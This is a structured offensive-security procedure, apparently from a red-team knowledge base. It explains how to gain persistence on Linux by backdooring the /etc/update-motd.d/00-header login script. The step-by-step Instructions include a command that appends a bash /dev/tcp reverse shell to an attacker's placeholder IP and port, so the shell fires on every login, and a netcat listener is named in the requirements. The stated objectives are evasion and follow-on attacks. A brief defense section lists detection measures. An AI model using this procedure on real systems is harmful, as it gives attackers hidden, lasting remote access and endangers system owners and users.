---
id: 2c2874d7-524e-4289-b83d-47738cb1352b
name: Linux-MOTD-Backdoor-for-Persistence
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:18.043518+00:00'
updated_at: '2023-04-10T20:34:17.239239+00:00'
tactics:
  - '[[Persistence]]'
techniques:
  - '[[Boot or Logon Autostart Execution]]'
  - '[[Hide Artifacts]]'
sub_techniques:
  - '[[Hidden Files and Directories]]'
tags:
  - linux-persistence
  - motd-backdoor
  - reverse-shell
commands:
  - '[[commands/list-motd-scripts]]'
  - '[[commands/append-bash-reverse-shell-to-motd-header]]'
  - '[[commands/view-motd-header-content]]'
platforms:
  - Linux
tools: []
validated: true
---

# Linux-MOTD-Backdoor-for-Persistence

## Summary

The Linux MOTD Backdoor for Persistence procedure establishes long-term access on a compromised Linux system by modifying the Message of the Day (MOTD) update scripts to execute a reverse shell command every time a user logs in via SSH or console. This technique leverages the system's automatic execution of scripts in /etc/update-motd.d/ during login, allowing attackers to regain a shell without installing obvious malware or modifying core system files.

## Description

On many Linux distributions, such as Ubuntu, the MOTD is dynamically generated at login by running executable scripts in the /etc/update-motd.d/ directory in numerical order. The 00-header script, if present, runs first and can be modified to inject malicious code. By appending a Bash reverse shell one-liner to this script, an attacker ensures that upon any user login, a connection is established back to the attacker's listener. This provides persistence that survives reboots and is less likely to be detected than cron jobs or service modifications, as it blends with normal login messages. The technique requires shell access with write privileges to the MOTD directory and outbound network connectivity. Success results in a reliable foothold for further post-exploitation activities like data exfiltration or lateral movement.

## Requirements

1. Local shell access to the target Linux system (e.g., via initial compromise or SSH).
2. Write permissions to the /etc/update-motd.d/ directory (typically requires root or sudo, but user-writable in some configurations).
3. Outbound TCP connectivity from the target to the attacker's IP and port (e.g., no firewall blocking port 4444).
4. A listener set up on the attacker's machine (e.g., using netcat: nc -lvnp 4444).

## Defense

- Implement file integrity monitoring (FIM) tools like AIDE or OSSEC to detect unauthorized changes to /etc/update-motd.d/ files.
- Enforce strict permissions on MOTD directories (chmod 755 /etc/update-motd.d/, chown root:root) and audit logs for modifications (e.g., via auditd).
- Monitor outbound network connections from login processes (sshd or getty) to unusual IPs/ports using tools like Suricata or host-based firewalls (ufw/iptables).
- Regularly review MOTD content and disable dynamic MOTD if not needed (update-motd --disable).

## Objectives

1. Establish persistent remote access triggered by user logins to maintain a foothold on the system.
2. Evade detection by hiding the backdoor within legitimate system login scripts.
3. Enable further attacks, such as command execution or privilege escalation, from the reverse shell.

## Instructions

### Step 1: Verify MOTD Directory Permissions

**Context**: Before modifying files, confirm the existence and writability of the /etc/update-motd.d/ directory and its scripts, such as 00-header. This ensures the target environment supports the technique and identifies any permission issues early.

**Command** ([[commands/list-motd-scripts]]):
```bash
ls -la /etc/update-motd.d/
```

> This lists all MOTD update scripts with permissions. Look for 00-header (or create it if missing) and ensure your user can write to the directory. If permissions are insufficient, escalate privileges first. Expected output includes files like '00-header -rwxr-xr-x'.

### Step 2: Append Reverse Shell to Header Script

**Context**: Modify the 00-header script by appending a Bash reverse shell one-liner. This injects the payload that will execute on login, connecting back to your listener without altering the script's primary function.

**Command** ([[commands/append-bash-reverse-shell-to-motd-header]]):
```bash
echo 'bash -c "bash -i >& /dev/tcp/$_ATTACKER_IP/$_ATTACKER_PORT 0>&1"' >> /etc/update-motd.d/00-header
```

> Replace $_ATTACKER_IP and $_ATTACKER_PORT with your listener details before running. This appends the command to the end of 00-header, ensuring it runs silently after any original content. No immediate output is produced, but the file is modified to trigger the shell on next login.

### Step 3: Verify the Modification

**Context**: Confirm the reverse shell command has been successfully added to the script. This step validates the backdoor installation and allows for any corrections before testing.

**Command** ([[commands/view-motd-header-content]]):
```bash
cat /etc/update-motd.d/00-header
```

> This displays the full content of 00-header. Success is indicated by the presence of the appended reverse shell line at the end. If the original script had content, it should remain intact above the new line.
